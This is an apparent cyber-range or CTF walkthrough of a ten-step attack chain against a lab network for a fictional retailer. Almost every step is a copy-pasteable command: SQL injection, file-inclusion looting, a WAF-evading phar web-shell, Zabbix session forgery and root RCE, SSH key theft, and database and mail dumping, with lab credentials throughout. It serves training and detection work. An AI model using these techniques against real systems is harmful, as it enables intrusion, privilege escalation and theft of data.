# ATB Market — Attack Chain (10 steps)

Every step maps to a running container and a **copy-pasteable command** that
works against the lab. Hostnames resolve via the compose network; from the host
use `localhost:<port>` (port column in [`asset-inventory.md`](./asset-inventory.md)).
The `attack/solve.py` reference solver (organizers: `make up-dev && make solve`)
executes the whole thing end-to-end and prints PASS/FAIL per step.

The commands below use the dev-exposed host ports (`make up-dev`, ports in
[`asset-inventory.md`](./asset-inventory.md)), so you can paste them on the host.
A real player starts at the perimeter and runs the internal steps (6 onward) from
the web-shell on the supplier box, using the in-network names like
`grafana.atbmarket.com` or `zb-app-p01` instead of `localhost`.

---

## Step 1 — Recon (mobapp + Moodle leak)

**1a. Hard-coded API creds from the APK** (`mobapp`):
```bash
curl -s -u 'reg_user:basic*88password!prod99' \
  -H 'Content-Type: application/json' \
  -d '{"phoneNumber":"+380000000000"}' \
  http://localhost:8081/register/login
# → 201 {"token":"eyJ...","message":"Auth OTP was sent..."}
```
Wrong Basic creds → `401`. (Detects as brute-force / hard-coded-cred use.)

**1b. Unauth Moodle config disclosure** (`education`):
```bash
curl -s -X POST 'http://localhost:8082/md/blocks/moco_news/ajax.php' \
  --data 'procedure=getPosts'
# → 200 JSON leaking dbuser/dbpass/smtpuser/smtppass/passwordsaltmain/siteadmins
```

## Step 2 — Boolean SQL injection (`www`)

Array **key** `filter[8][490]` is concatenated into SQL; the value is
parametrised. Boolean oracle = HTTP 200 (true) vs 500 (false/error):
```bash
curl -s -o /dev/null -w '%{http_code}\n' 'http://localhost:8080/shop/catalog/novetly?filter[8][490]=1'          # 200 baseline
curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/shop/catalog/novetly?filter[8][490']=1"         # 500 error
curl -s -o /dev/null -w '%{http_code}\n' 'http://localhost:8080/shop/catalog/novetly?filter[8][490 AND 1=1]=1'  # 200 true
```
Blind extraction helper: `attack/sqli_oracle.py` pulls `version()`,
`database()`, `user()`, `COUNT(*) FROM users` via the 200/500 oracle.

## Step 3 — Supplier portal self-registration (`supplier`)

The password-reset endpoint only leaks the reset GUID when you ask for the link
with `link=1`. Grab the GUID, set a password, then log in to get a `PHPSESSID`.
That session is what unlocks step 4.
```bash
S=http://localhost:8083; U=b9atbsup01@guerrillamailblock.com
# self-register (no moderation)
curl -s "$S/index.php?entryPoint=RegistrationStep3" --data "user_name=$U"
# link=0 does NOT leak the GUID; link=1 does
curl -s "$S/index.php?entryPoint=GeneratePassword" --data "user_name=$U&link=1" \
  | grep -o 'guid=[0-9a-f-]\{36\}'
GUID=...   # copy it from the line above
curl -s "$S/index.php?entryPoint=Changenewpassword&guid=$GUID" \
  --data 'password1=AtbB9Sup2026x!&password2=AtbB9Sup2026x!'
# log in and keep the session cookie
SID=$(curl -s -i "$S/index.php?action=Login" \
  --data "user_name=$U&password=AtbB9Sup2026x!" \
  | grep -o 'PHPSESSID=[0-9a-f]*' | head -1 | cut -d= -f2)
echo "PHPSESSID=$SID"
```

## Step 4 — LFI via Import mapping (`supplier`)

The Import mapping reads any file you name. It needs the logged-in session from
step 3 (anonymous requests get 401). Read the config to loot the secrets.
```bash
read_file(){ curl -s -b "PHPSESSID=$SID" \
  "$S/index.php?module=Import&action=RefreshMapping" --data "importFile=$1"; }

read_file config.php                                   # relative read: supplier-db creds web_db2 / Wdjg84kV@ / pp_web1
read_file /var/www/config_override.php                 # 3 Oracle DSNs (erpdb:1581, retaildb:1521, ISMEDOC-DB:1251), LDAP host
read_file /var/www/custom/blowfish/InboundEmail.php    # Blowfish key for the mailbox password (step 9)
read_file /etc/zabbix/zabbix_agentd.conf               # breadcrumb: Server=zb-app-p01, grafana URL (step 6)
read_file /etc/hostname                                # sp-web-p01
```

## Step 5 — phar polyglot web-shell (`supplier`)

The WAF only scans the first ~180 KB of the body, so the phar payload is padded
past that window. `upload_phar.py` uploads a PNG+phar polyglot, triggers the
deserialization, and drops a web-shell at `/upload/shell.php`.
```bash
python3 attack/upload_phar.py http://localhost:8083
# run commands through the shell (base64 in the z= parameter):
curl -s "http://localhost:8083/upload/shell.php?z=$(printf 'id; hostname' | base64)"
# → uid=993(nginx) ... sp-web-p01   (you are now inside the network)
```

## Step 6 — Privilege escalation via Grafana → Zabbix (`grafana`,`zabbix`)

Grafana's "Zabbix DB" data source is an over-privileged MySQL account, so its
Explore SQL console reads `config.session_key` and writes a forged Admin session
straight into Zabbix's `sessions` table. The signed `zbx_session` cookie gets you
the frontend as Admin; the raw `sessionid` doubles as the JSON-RPC `auth` token.
Ports below are the dev-exposed ones (`make up-dev`); from the player's pivot box
use the in-network names `grafana.atbmarket.com:3000` / `zabbix.atbmarket.com:8080`.

```bash
G=http://localhost:3000; Z=http://localhost:8084
# 1. log in to Grafana with the reused education creds -> session token
TOK=$(curl -s "$G/login" -H 'Content-Type: application/json' \
  -d '{"user":"education@atbmarket.com","password":"Edu003868$"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
GC="Cookie: grafana_session=$TOK"
sql(){ curl -s "$G/explore" -H "$GC" -H 'Content-Type: application/json' -d "{\"sql\":\"$1\"}"; }

# 2. read the Zabbix session signing key, 3. INSERT a forged Admin (userid 1) session
KEY=$(sql 'SELECT session_key FROM config' | python3 -c 'import sys,json;print(json.load(sys.stdin)["rows"][0][0])')
SID=$(python3 -c 'import secrets;print(secrets.token_hex(16))')
sql "INSERT INTO sessions (sessionid,userid,lastaccess,status) VALUES ('$SID',1,UNIX_TIMESTAMP(),0)"

# 4. forge the signed cookie: base64({sessionid,sign}), sign=HMAC-SHA256(key, {"sessionid":sid})
COOKIE=$(python3 - "$SID" "$KEY" <<'PY'
import sys,hmac,hashlib,base64,json
sid,key=sys.argv[1],sys.argv[2]
sign=hmac.new(key.encode(), json.dumps({"sessionid":sid},separators=(",",":")).encode(), hashlib.sha256).hexdigest()
print(base64.b64encode(json.dumps({"sessionid":sid,"sign":sign},separators=(",",":")).encode()).decode())
PY)
curl -s -o /dev/null -w '%{http_code}\n' "$Z/zabbix.php?action=dashboard.view" -H "Cookie: zbx_session=$COOKIE"  # Admin

# 5. RCE as root: the raw sessionid is a valid JSON-RPC auth token (Execute on: Zabbix server, AllowRoot=1)
curl -s "$Z/api_jsonrpc.php" -H 'Content-Type: application/json-rpc' \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"diag\",\"command\":\"id; hostname\",\"type\":0,\"scope\":2,\"execute_on\":1},\"auth\":\"$SID\",\"id\":1}"
# then host.get "Zabbix server" -> script.execute {scriptid,hostid} -> uid=0(root) on zb-app-p01
```

`attack/solve.py` `step6()` is the canonical, always-green version of the above.

## Step 7 — Keys to everything (`squid`,`jenkins`,`backup`,`bastion`)

Jenkins runs a Zabbix agent, and that agent only answers its own server
`zb-app-p01`. So you cannot hit it straight from the pivot box. You already have
root on the Zabbix server from step 6, so run `zabbix_get` from there. The agent
allows `system.run`, which gives you command execution on Jenkins. Jenkins has a
CIFS backup mounted at `/mnt/BACKUP` (see its `/etc/fstab`) that holds the root
SSH key. Read it, decode it, and SSH to the bastion.

```bash
# a direct call from anywhere but the Zabbix server is dropped by the agent:
python3 attack/zbxd_run.py id jenkins.atbmarket.com 10050     # no uid= in the reply

# the real path: run zabbix_get from the Zabbix server (step-6 root global script).
# system.run on the Jenkins agent reads the backup and base64-encodes it:
zabbix_get -s jenkins.atbmarket.com -k 'system.run[base64 -w0 /mnt/BACKUP/root.tar.gz]'
#   -> base64 blob; decode it to root.tar.gz, which contains root/.ssh/id_rsa_root + ssh config

tar -xzf root.tar.gz root/.ssh/id_rsa_root
ssh -i root/.ssh/id_rsa_root root@bastion-main-p01       # from the supplier shell or Zabbix
# (dev host ports: ssh ... root@localhost -p 2210)
```

`attack/solve.py` `step7()` is the canonical, always-green version of the above.

## Step 8 — Databases (mysql/postgres/oracle mocks)

The creds for these are scattered across Harbor images, configs and shell
history that earlier steps exposed. Harbor leaks the ishop DSN, the LFI config
had the Oracle creds, and the bastion history points at the retail/HR DBs.
```bash
# retail DB creds leaked in a Harbor image layer, then dump customers
curl -s http://localhost:8085/image/ishop/api/env | grep -i mysql     # DSN with rEQaZ55o7x_E53oC
mysql -h127.0.0.1 -P3306 -uishop -p'rEQaZ55o7x_E53oC' ishop -e 'SELECT COUNT(*) FROM users;'
# HR / store-plus (PostgreSQL)
PGPASSWORD=Qw123456 psql -h127.0.0.1 -p5432 -U asu -d asu -c 'SELECT count(*) FROM employees;'
# Oracle (mock listeners) with the DSNs from config_override.php
python3 attack/oracle_probe.py localhost 1581 XX_SUP_PORTAL_RO S0h6jWot2fTLSMm      # ERP (erpdb/PROD)
python3 attack/oracle_probe.py localhost 1521 SUPP_PORT_READER 'C3KPgME{p=VyYmeTD6BqaIjN2'  # RMS (retaildb/retekdb)
python3 attack/oracle_probe.py localhost 1251 MEDOC HIr3t4G8Zso7                    # MEDOC (ISMEDOC-DB/ZVITZAKUP)
# bind to the directory with the reused edu creds
curl -s http://localhost:8386/bind --data 'bind_dn=education@atbmarket.com&password=Edu003868$'
```

## Step 9 — Mail (`exchange`)

Decrypt the supplier mailbox password (Blowfish key from step 4), then read the
inbox over EWS. The OWA service is plain HTTP on 8444.
```bash
curl -s -u 'supplier@atbmarket.com:supplier123569' \
  -H 'Content-Type: text/xml' --data @attack/ews_finditem.xml \
  http://localhost:8444/ews/Exchange.asmx
# → FindItem response with TotalItemsInView="15907"
```

## Step 10 — Source code (`gitlab`)

GitLab's SSH only trusts the bastion's IP, so a direct connection with the root
key is refused. Jump through the bastion (which you reached in step 7).
```bash
K=/tmp/root/.ssh/id_rsa_root
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o LogLevel=ERROR"
# direct is refused (GitLab only trusts the bastion IP):
ssh -i $K $OPTS -p 2222 root@localhost id            # Permission denied, no uid=0
# go through the bastion with ProxyJump, then count the repos:
ssh -i $K $OPTS \
  -o ProxyCommand="ssh -i $K $OPTS -p 2210 -W %h:%p root@localhost" \
  root@gitlab-p01 'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l'   # 524
```

(The `id_rsa_root` key and the `.ssh/config` in the backup come from step 7. The
Splunk `admin:changeme` default on :8000 is an in-joke, not a chain step.)

---

### Detection view (Splunk)
Every step emits structured events to `/var/log/atb/*.json`, indexed by Splunk
under index `atb`. See [`../splunk/detections.md`](../splunk/detections.md) for
the SPL that fires on each stage.
